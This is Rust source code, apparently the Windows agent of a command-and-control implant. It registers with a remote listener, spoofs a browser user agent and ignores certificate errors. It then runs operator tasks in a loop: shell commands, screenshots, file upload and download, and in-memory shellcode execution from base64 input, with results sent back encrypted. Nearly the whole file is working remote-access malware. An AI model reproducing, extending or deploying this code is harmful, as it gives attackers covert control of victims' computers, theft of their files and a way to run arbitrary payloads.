use crate::{
    core::{
        postdata::{CipherData, PlainData, RegisterAgentData},
        systeminfo::systeminfo_windows::get_computer_name,
        tasks::{screenshot::screenshot, win::shell::shell},
    },
    crypto::aesgcm::{cipher, decipher, EncMessage},
    utils::random::{random_name, random_sleeptime},
    utils::uuid::get_uuid_windows,
    Config,
};
use chrono::Local;
use flate2::write::{GzDecoder, GzEncoder};
use flate2::Compression;
use regex::Regex;
use reqwest::header::{HeaderMap, HeaderValue, CONTENT_TYPE, USER_AGENT};
use reqwest::Client;
use screenshots::image::math;
use std::io::Write;
use std::path::Path;
use std::time::SystemTime;
use std::{fs, io, thread, time};
use windows::core::{Error, HSTRING};
use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret, StaticSecret};
use crate::core::tasks::win::loads::nt_heap_alloc;

pub async fn run(mut config: Config) -> Result<(), Error> {
    let user_agent = HSTRING::from(config.listener.user_agent.to_string());

    // Get agent info for registration
    // let agent_name = random_name("agent".to_owned());

    let agent_uuid = get_uuid_windows();

    let hostname = get_computer_name().unwrap_or_else(|_| "unknown".to_string());
    let os = std::env::consts::OS.to_string();
    let arch = std::env::consts::ARCH.to_string();
    let listener_url = format!(
        "{}://{}:{}/",
        config.listener.proto.to_string(),
        config.listener.host.to_string(),
        config.listener.port.to_owned(),
    );

    let rad = RegisterAgentData::new(
        agent_uuid.to_string(),
        hostname,
        os,
        arch,
        listener_url.clone(),
        config.my_public_key,
    );
    let rad_json = serde_json::to_string(&rad.clone()).unwrap();

    let ua = config.listener.user_agent.clone();
    let mut headers = HeaderMap::new();
    headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/json"));
    headers.insert(
        USER_AGENT,
        HeaderValue::from_static(
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
        ),
    );

    let client = Client::builder()
        .danger_accept_invalid_certs(true) // 跳过证书验证
        .build();

    // Agent registration process
    let mut registered = false;
    while !registered {
        tokio::time::sleep(random_sleeptime(
            config.sleep.to_owned(),
            config.jitter.to_owned(),
        ))
        .await;

        match config.listener.proto.as_str() {
            "mTLS" => {}
            "dns" => {}
            _ => {
                // Register agent
                let client = Client::builder().danger_accept_invalid_certs(true).build();

                let response = client
                    .unwrap()
                    .post(listener_url.clone() + "r")
                    .headers(headers.clone())
                    .body(rad_json.clone())
                    .send()
                    .await;

                match response {
                    Ok(res) => {
                        if res.status().is_success() {
                            registered = true;
                            let response_text = res.text().await;
                        }
                    }
                    Err(e) => {
                        // println!("Error: {:?}", e);
                        return Ok(());
                    }
                }
            }
        }
    }

    loop {
        // TODO: Implement graceful shutdown.

        tokio::time::sleep(random_sleeptime(
            config.sleep.to_owned(),
            config.jitter.to_owned(),
        ))
        .await;

        let plain_data = PlainData::new(
            agent_uuid.to_string(),
            Local::now().format("%H:%M:%S").to_string(),
        );
        let plain_data_json = serde_json::to_string(&plain_data).unwrap();

        // Get task
        let client = Client::builder().danger_accept_invalid_certs(true).build();

        let response = client
            .unwrap()
            .post(listener_url.clone() + "t/a")
            .headers(headers.clone())
            .body(plain_data_json.clone())
            .send()
            .await;

        let task = match response {
            Ok(res) => {
                let result_text = res.text().await.unwrap();

                if result_text.clone() == "" {
                    continue;
                }

                let cipher_data: CipherData = serde_json::from_str(&result_text.clone()).unwrap();
                let deciphered_task = decipher(
                    EncMessage {
                        ciphertext: cipher_data.c,
                        nonce: cipher_data.n,
                    },
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                );
                String::from_utf8(deciphered_task)?
            }
            Err(e) => {
                tokio::time::sleep(random_sleeptime(
                    config.sleep.to_owned(),
                    config.jitter.to_owned(),
                ))
                .await;

                // 重新注册，服务端掉了，马不掉
                let mut reg_bool = false;

                while !reg_bool {
                    let client = Client::builder().danger_accept_invalid_certs(true).build();

                    let response = client
                        .unwrap()
                        .post(listener_url.clone() + "r")
                        .headers(headers.clone())
                        .body(rad_json.clone())
                        .send()
                        .await;

                    match response {
                        Ok(res) => {
                            if res.status().is_success() {
                                reg_bool = true;
                                let response_text = res.text().await;
                            }
                        }
                        Err(e) => {
                            // println!("Error: {:?}", e);
                        }
                    }
                }

                continue;
            }
        };

        // println!("Task: {task}");

        // Execute task
        let task_args = match shellwords::split(&task) {
            Ok(args) => args,
            Err(_) => continue,
        };

        if task_args.len() == 0 {
            continue;
        }

        match task_args[0].as_str() {
            "cd" => match std::env::set_current_dir(task_args[1].as_str()) {
                Ok(result) => {
                    post_task_result(
                        listener_url.clone(),
                        "The current directory chanted successfully.".as_bytes(),
                        headers.clone(),
                        agent_uuid.to_string(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                    )
                    .await;
                }
                Err(e) => {
                    post_task_result(
                        listener_url.clone(),
                        e.to_string().as_bytes(),
                        headers.clone(),
                        agent_uuid.to_string(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                    )
                    .await;
                }
            },
            "ls" => match fs::read_dir(task_args[1].as_str()) {
                Ok(result) => {
                    let re = Regex::new(r"\\").unwrap();

                    let mut output = String::new();
                    output = output + "\n";
                    for path in result {
                        if let Ok(entry) = path {
                            let entry_name = &entry.path().to_string_lossy().to_string();
                            let entry_name_2 = re.replace_all(entry_name, "/");
                            let entry_name_3 = entry_name_2.split("/").last().unwrap().to_string();

                            if let Ok(metadata) = entry.metadata() {
                                output = output
                                    + format!("{:<20} {}\n", entry_name_3, metadata.len()).as_str();
                            } else {
                                output = output + format!("{}", entry_name_3).as_str();
                            }
                        }
                    }

                    post_task_result(
                        listener_url.clone(),
                        output.as_bytes(),
                        headers.clone(),
                        agent_uuid.to_string(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                    )
                    .await;
                }
                Err(e) => {
                    post_task_result(
                        listener_url.clone(),
                        e.to_string().as_bytes(),
                        headers.clone(),
                        agent_uuid.to_string(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                    )
                    .await;
                }
            },
            "pwd" => match std::env::current_dir() {
                Ok(result) => {
                    post_task_result(
                        listener_url.clone(),
                        &result.to_str().unwrap().as_bytes(),
                        headers.clone(),
                        agent_uuid.to_string(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                    )
                    .await;
                }
                Err(e) => {
                    post_task_result(
                        listener_url.clone(),
                        e.to_string().as_bytes(),
                        headers.clone(),
                        agent_uuid.to_string(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                    )
                    .await;
                }
            },
            "screenshot" => match screenshot().await {
                Ok(result) => {
                    post_task_result(
                        listener_url.clone(),
                        &result,
                        headers.clone(),
                        agent_uuid.to_string(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                    )
                    .await;
                }
                Err(e) => {
                    post_task_result(
                        listener_url.clone(),
                        e.to_string().as_bytes(),
                        headers.clone(),
                        agent_uuid.to_string(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                    )
                    .await;
                }
            },
            "shell" => match shell(task_args[1..].join(" ")).await {
                Ok(result) => {
                    post_task_result(
                        listener_url.clone(),
                        &result,
                        headers.clone(),
                        agent_uuid.to_string(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                    )
                    .await;
                }
                Err(e) => {
                    post_task_result(
                        listener_url.clone(),
                        e.to_string().as_bytes(),
                        headers.clone(),
                        agent_uuid.to_string(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                    )
                    .await;
                }
            },
            "sleep" => {
                let parts: Vec<&str> = task_args[1].split(',').collect();
                config.sleep = parts[0].parse().unwrap();
                config.jitter = parts[1].parse().unwrap();
                post_task_result(
                    listener_url.clone(),
                    "Set delay successfully.".as_bytes(),
                    headers.clone(),
                    agent_uuid.to_string(),
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                )
                .await;
            }
            "upload" => {
                let parts: Vec<&str> = task_args[1].split(',').collect();
                let file_name: String = parts[0].to_string();
                let gzip_data_qi4l: String = parts[1].to_string();
                let gzip_data_qi5l = base64::decode(&gzip_data_qi4l).unwrap();

                let decompressed_data = decompress_from_gzip(&gzip_data_qi5l);
                match decompressed_data {
                    Ok(decompressed_data) => {
                        match fs::write(file_name.clone(), &decompressed_data) {
                            Ok(_) => {}
                            Err(e) => {
                                // println!("Error writing file: {}", e);
                            }
                        };
                    }
                    Err(e) => {
                        // println!("Error reading file: {}", e);
                    }
                }

                let req_qi4l = format!("File {} uploaded successfully", file_name.clone());

                post_task_result(
                    listener_url.clone(),
                    req_qi4l.as_bytes(),
                    headers.clone(),
                    agent_uuid.to_string(),
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                )
                .await;
            }
            "download" => {
                let path = Path::new(task_args[1].as_str());

                let gzip_data: Vec<u8>;
                let file_name = path.file_name().unwrap().to_string_lossy().to_string();
                let file_path = path.to_string_lossy().to_string();

                match is_file(&file_path) {
                    Ok(true) => {
                        let data = fs::read(&file_path).unwrap();
                        gzip_data = compress_to_gzip(&data).unwrap();
                    }
                    Ok(false) => {
                        // println!("路径 '{}' 是一个文件夹路径！", &file_path);
                        continue;
                    }
                    Err(e) => {
                        // println!("无法判断路径 '{}': {} ", &file_path, e);
                        continue;
                    }
                }

                let gzip_data_qi4l = base64::encode(&gzip_data);

                let req_qi4l = format!("{},{}", file_name.clone(), gzip_data_qi4l);

                post_task_result(
                    listener_url.clone(),
                    req_qi4l.as_bytes(),
                    headers.clone(),
                    agent_uuid.to_string(),
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                )
                .await;
            }
            "whoami" => match shell("cmd whoami".to_string()).await {
                Ok(result) => {
                    post_task_result(
                        listener_url.clone(),
                        &result,
                        headers.clone(),
                        agent_uuid.to_string(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                    )
                    .await;
                }
                Err(e) => {
                    post_task_result(
                        listener_url.clone(),
                        e.to_string().as_bytes(),
                        headers.clone(),
                        agent_uuid.to_string(),
                        config.my_secret_key.clone(),
                        config.server_public_key.clone(),
                    )
                    .await;
                }
            },
            "shellcode" => {
                let shellcode_data = task_args[1].clone();

                let shellcode_data = base64::decode(&shellcode_data).unwrap();

                nt_heap_alloc(shellcode_data).await;

                let req_qi4l = format!("{},{}", "", "");

                post_task_result(
                    listener_url.clone(),
                    req_qi4l.as_bytes(),
                    headers.clone(),
                    agent_uuid.to_string(),
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                )
                    .await;
            }
            _ => {
                continue;
            }
        }
    }
}

async fn post_task_result(
    qi4l_connect: String,
    result: &[u8],
    heads: HeaderMap,
    agent_name: String,
    my_secret_key: StaticSecret,
    server_public_key: PublicKey,
) {
    let cipher_data = CipherData::new(agent_name, result, my_secret_key, server_public_key);
    let cipher_data_json = serde_json::to_string(&cipher_data).unwrap();

    let client = Client::builder().danger_accept_invalid_certs(true).build();

    let response = client
        .unwrap()
        .post(qi4l_connect.clone() + "t/r")
        .headers(heads.clone())
        .body(cipher_data_json.to_string())
        .send()
        .await;
}

fn is_file(path: &str) -> Result<bool, io::Error> {
    let metadata = fs::metadata(path)?;
    Ok(metadata.is_file())
}

fn compress_to_gzip(data: &[u8]) -> io::Result<Vec<u8>> {
    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(data)?;
    encoder.finish()
}

// 解压函数
fn decompress_from_gzip(data: &[u8]) -> io::Result<Vec<u8>> {
    let mut decoder = GzDecoder::new(Vec::new());
    decoder.write_all(data)?;
    decoder.finish()
}

// fn close_handler(h: &mut HInternet) {
//     h.close();
// }
